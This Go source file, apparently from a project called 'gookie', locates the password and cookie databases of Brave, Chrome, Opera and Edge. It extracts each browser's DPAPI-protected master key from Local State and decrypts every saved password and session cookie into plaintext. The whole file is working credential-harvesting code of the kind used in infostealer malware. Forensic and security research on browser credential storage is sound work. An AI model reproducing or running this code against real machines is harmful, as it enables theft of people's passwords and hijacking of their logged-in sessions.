package chromium

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"gookie/pkg/utils"
	"os"
	"path/filepath"
	"unsafe"
)

type BrowserDataFetcher struct {
	aesKey []byte
}

// NewBrowserDataFetcher creates a new BrowserDataFetcher.
func NewBrowserDataFetcher() *BrowserDataFetcher {
	return &BrowserDataFetcher{}
}

// GetAllBrowserData is a method of BrowserDataFetcher that gathers and returns all browser data.
func (b *BrowserDataFetcher) GetAllBrowserData() (JSONStruct, error) {
	bravePasswords, err := b.readChromiumPasswords(bravePasswordPath, braveKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readBravePasswords: %v", err)
	}

	braveCookies, err := b.readChromiumCookies(braveCookiesPath, braveKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readBraveCookies: %v", err)
	}

	chromePasswords, err := b.readChromiumPasswords(chromePasswordPath, chromeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readChromePasswords: %v", err)
	}

	chromeCookies, err := b.readChromiumCookies(chromeCookiesPath, chromeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readChromeCookies: %v", err)
	}

	operaPasswords, err := b.readChromiumPasswords(operaPasswordPath, operaKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readOperaPasswords: %v", err)
	}

	operaCookies, err := b.readChromiumCookies(operaCookiesPath, operaKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readOperaCookies: %v", err)
	}

	edgePasswords, err := b.readChromiumPasswords(edgePasswordPath, edgeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readEdgePasswords: %v", err)
	}

	edgeCookies, err := b.readChromiumCookies(edgeCookiesPath, edgeKeyPath)
	if err != nil {
		return JSONStruct{}, fmt.Errorf("readEdgeCookies: %v", err)
	}

	consolidated := JSONStruct{
		BravePasswords:  bravePasswords,
		BraveCookies:    braveCookies,
		ChromePasswords: chromePasswords,
		ChromeCookies:   chromeCookies,
		EdgePasswords:   edgePasswords,
		EdgeCookies:     edgeCookies,
		OperaPasswords:  operaPasswords,
		OperaCookies:    operaCookies,
	}

	return consolidated, nil
}

// readChromiumCookies is a method of BrowserDataFetcher that reads and decrypts cookies from a Chromium-based browser.
func (b *BrowserDataFetcher) readChromiumCookies(path, keyPath string) ([]Cookie, error) {
	rows, err := b.queryDatabase(path, chromiumCookieQuery, keyPath)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []Cookie

	for rows.Next() {
		var cookie Cookie
		var expires, httpOnly, secure int64

		err = rows.Scan(&cookie.Domain, &expires, &httpOnly, &cookie.Name,
			&cookie.Path, &secure, &cookie.Value, &cookie.EncryptedValue)
		if err != nil {
			return nil, fmt.Errorf("error scanning row: %w", err)
		}

		cookie.Expires = utils.EpochToTime((expires / 1000000) - 11644473600)
		cookie.IsExpired = utils.IsExpired(expires)
		cookie.HttpOnly = utils.IntToBool(httpOnly)
		cookie.IsSecure = utils.IntToBool(secure)
		decrypted, err := b.decryptValue(cookie.EncryptedValue)
		if err != nil {
			return nil, fmt.Errorf("error decrypting: %w", err)
		}
		cookie.Value = string(decrypted)
		cookie.EncryptedValue = nil

		cookies = append(cookies, cookie)
	}
	return cookies, nil
}

// readChromiumPasswords is a method of BrowserDataFetcher that reads and decrypts passwords from a Chromium-based browser.
func (b *BrowserDataFetcher) readChromiumPasswords(path, keyPath string) ([]Password, error) {
	rows, err := b.queryDatabase(path, chromiumPasswordQuery, keyPath)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var passwords []Password

	for rows.Next() {
		var password Password

		err = rows.Scan(&password.URL, &password.Username, &password.PasswordEncrypted)
		if err != nil {
			return nil, fmt.Errorf("error scanning row: %w", err)
		}
		decrypted, err := b.decryptValue(password.PasswordEncrypted)
		if err != nil {
			return nil, err
		}
		password.PasswordDecrypted = string(decrypted)
		password.PasswordEncrypted = nil
		passwords = append(passwords, password)
	}
	return passwords, nil
}

// getAesGCMKey retrieves the AES GCM key from a browser's Local State file.
func (b *BrowserDataFetcher) getAesGCMKey(keyPath string) error {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	localStatePath := filepath.Join(osUser, keyPath)
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return err
	}

	var localState map[string]interface{}
	if err = json.Unmarshal(data, &localState); err != nil {
		return err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return errors.New("os_crypt key not found in localState")
	}

	encryptedKeyStr, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return errors.New("encrypted_key not found in os_crypt")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyStr)
	if err != nil {
		return err
	}

	if !bytes.Equal(encryptedKey[0:5], []byte{'D', 'P', 'A', 'P', 'I'}) {
		return errors.New("encrypted_key does not look like DPAPI key")
	}

	encryptedKey, err = b.decryptValue(encryptedKey[5:])
	if err != nil {
		return err
	}

	b.aesKey = encryptedKey

	return nil
}

// decryptValue decrypts a value using either AES GCM or Windows CryptUnprotectData.
func (b *BrowserDataFetcher) decryptValue(data []byte) ([]byte, error) {
	if bytes.Equal(data[0:3], []byte{'v', '1', '0'}) {
		aesBlock, err := aes.NewCipher(b.aesKey)
		if err != nil {
			return nil, fmt.Errorf("error creating cipher block: %w", err)
		}

		aesGCM, err := cipher.NewGCM(aesBlock)
		if err != nil {
			return nil, fmt.Errorf("error creating GCM: %w", err)
		}

		nonce := data[3:15]
		encryptedData := data[15:]

		plaintext, err := aesGCM.Open(nil, nonce, encryptedData, nil)
		if err != nil {
			return nil, err
		}

		return plaintext, nil

	} else {
		var outBlob DataBlob
		r, _, err := PCryptUnprotectData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
		if r == 0 {
			return nil, err
		}
		defer PLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

		return outBlob.toByteArray(), nil
	}
}

// queryDatabase is a helper function to make a query from a SQL database.
func (b *BrowserDataFetcher) queryDatabase(path, query, keyPath string) (*sql.Rows, error) {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	dbPath := filepath.Join(osUser, path)

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", dbPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	err = b.getAesGCMKey(keyPath)
	if err != nil {
		return nil, err
	}
	rows, err := dbConn.Query(query)
	if err != nil {
		return nil, err
	}

	return rows, nil
}
